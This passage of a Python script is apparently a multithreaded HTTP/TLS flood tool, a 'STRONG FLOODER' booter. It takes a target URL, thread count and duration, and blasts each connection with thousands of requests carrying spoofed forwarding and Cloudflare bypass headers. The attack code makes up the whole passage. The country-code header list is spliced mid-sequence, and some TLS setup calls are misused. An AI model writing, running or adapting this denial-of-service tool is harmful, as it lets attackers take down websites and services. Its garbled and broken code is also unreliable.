            protocols = ['stun.turn', 'stun.nat-discovery', 'h2c', 'smb', 'h3', 'h2', 'http/1.1', 'http/1.0', 'http/0.9', 'spdy/1', 'spdy/2', 'spdy/3', 'spdy/3.1', 'quic', 'ldap', 'ftp', 'imap', 'pop3', 'dns', 'xmpp-client', 'webrtc', 'c-webrtc', 'coap', 'managesieve', 'xmpp-server', 'acme-tls/1', 'mqtt', 'dot', 'ntske/1', 'sunrpc', 'irc', 'doq', 'sip2', 'tds/8.0', 'dicom']
            for p in protocols:
             ssl_context.set_alpn_protocols(p)
            ssl_context.set_default_verify_paths
            curve_list = ['prime256v1','secp384r1','secp521r1',"NIST P-521"]
            for ecdh_got in curve_list:
             try:
               ssl_context.set_ecdh_curve(ecdh_got)
             except:
               pass
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = '/'+generate_url_path(random.randint(1,5))
            url_leak = ''
            if  '/' in target['uri']:
               url_leak = target['uri']
            else:
               url_leak = '/'
            a = gen_ips()
            gen_id2 = gen_id()
            ua = random_useragent()
            byt = f"{methods} {random.choice((url_leak,url_path))} HTTP/1.1\nUser-Agent: {ua}\nHost: {target['host']}\nForwarded: by={target['host']},{a};for={target['host']},{a};host={target['host']};proto=http,https\nMax-Forwards: 65536\nCookie: {a}={generate_url_path(15)}\nAuthorization: {generate_url_path(random.randint(1,25))} /wAeHwBKGhsAW2wdAQIAOv/dqq+/rLzeoba5EJk=\nX-Forwarded-Ssl: on\nX-Url-Scheme: https\nConnection: Upgrade\nUpgrade: h2c, websocket\nUpgrade-Insecure-Requests: 1\nAccess-Control-Request-Method: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nX-HTTP-Method-Override: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nAllow: GET, POST, HEAD, PUT, PATCH, OPTIONS, DELETE\nRetry-After: 65536\nX-Requested-With: XMLHttpRequest\nX-Request-ID: {gen_id2}\nAlt-Used: {target['host']}\nConnect-Via-Https: on\nConnect-Via-Port: 443\nConnect-Via-IP: {a}\nConnect-Via-Host: {target['host']}\nCF-Host-Origin-IP: {a}\nX-SSL-Server-IP: {a}\nX-Real-IP: {a}\nX-SSL-Protocol: SSLv1.0, SSLv2.0, SSLv3.0, TLSv1.0, TLSv1.1, TLSv1.2, TLSv1.3\nCF-Worker: {target['host']},{a}\ncf-cache-status: MISS\nCloudflare-CDN-Cache-Control: max-age=24400, stale-if-error=60\nCDN-Cache-Control: max-age=18000, stale-if-error=200\nCache-Control: public, no-cache, stale-if-error=400\ncf-ray: null\ncf-verified-bot: true\n\nCDN-Loop: cloudflare\nCF-IPCountry: AA, AB, AC, AD, AE, AF, AG, AH, AI, AJ, AK, AL, AM, AN, AO, AP, AQ, AR, AS, AT, AU, AV, AW, AX, AY, AZ, BA, BB, BC, BD, BE, BF, BG, BH, BI, BJ, BK, BL, BM, BN, BO, BP, BQ, BR, BS, BT, BU, BV, BW, BX, BY, BZ, CA, CB, CC, CD, CE, CF, CG, CH, CI, CJ, CK, CL, CM, CN, CO, CP, CQ, CR, CS, CT, CU, CV, CW, CX, CY, CZ, DA, DB, DC, DD, DE, DF, DG, DH, DI, DJ, DK, DL, DM, DN, DO, DP, DQ, DR, DS, DT, DU, DV, DW, DX, DY, DZ, EA, EB, EC, ED, EE, EF, EG, EH, EI, EJ, EK, EL, EM, EN, EO, EP, EQ, ER, ES, ET, EU, EV, EW, EX, EY, EZ, FA, FB, FC, FD, FE, FF, FG, FH, FI, FJ, FK, FL, FM, FN, FO, FP, FQ, FR, FS, FT, FU, FV, FW, FX, FY, FZ, GA, GB, GC, GD, GE, GF, GG, GH, GI, GJ, GK, GL, GM, GN, GO, GP, GQ, GR, GS, GT, GU, GV, GW, GX, GY, GZ, HA, HB, HC, HD, HE, HF, HG, HH, HI, HJ, HK, HL, HM, HN, HO, HP, HQ, HR, HS, HT, HU, HV, HW, HX, HY, HZ, IA, IB, IC, ID, IE, IF, IG, IH, II, IJ, IK, IL, IM, IN, IO, IP, IQ, IR, IS, IT, IU, IV, IW, IX, IY, IZ, JA, JB, JC, JD, JE, JF, JG, JH, JI, JJ, JK, JL, JM, JN, JO, JP, JQ, JR, JS, JT, JU, JV, JW, JX, JY,Q, UR, US, UT, UU, UV, UW, UX, UY, UZ, VA, VB, VC, VD, VE, VF, VG, VH, VI, VJ, VK, VL, VM, VN, VO, VP, VQ, VR, VS, VT, VU, VV, VW, VX, VY, VZ, WA, WB, WC, WD, WE, WF, WG, WH, WI, WJ, WK, WL, WM, WN, WO, WP, WQ, WR, WS, WT, WU, WV, WW, WX, WY, WZ, XA, XB, XC, XD, XE, XF, XG, XH, XI, XJ, XK, XL, XM, XN, XO, XP, XQ, XR, XS, XT, XU, XV, XW, XX, XY, XZ, YA, YB, YC, YD, YE, YF, YG, YH, YI, YJ, YK, YL, YM, YN, YO, YP, YQ, YR, YS, YT, YU, YV, YW, YX, YY, YZ, ZA, ZB, ZC, ZD, ZE, ZF, ZG, ZH, ZI, ZJ, ZK, ZL, ZM, ZN, ZO, ZP, ZQ, ZR, ZS, ZT, ZU, ZV, ZW, ZX, ZY, ZZ, XX, T1\nCf-Access-Authenticated-User-Email: {generate_url_path(random.randint(1,15))}@{target['host']}\nCf-Device-Type: mobile, tablet, desktop\nClient-IP: {a}\nReal-IP: {a}\n\n\r\r".encode()
            for _ in range(500):
                ssl_socket.write(byt)
                ssl_socket.sendall(byt)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
            ssl_socket.close()
        except Exception as e:
           print(e)
           pass
import sys
url = ''
METHODS = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO STRONG FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
target = get_target(url)
for _ in range(int(thread_lower)):
   threading.Thread(target=HUGE_CIHPERS,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=HUGE_CIHPERS,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=HUGE_CIHPERS,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=HUGE_CIHPERS,args=(target,METHODS,time_booter)).start()
   threading.Thread(target=HUGE_CIHPERS,args=(target,METHODS,time_booter)).start()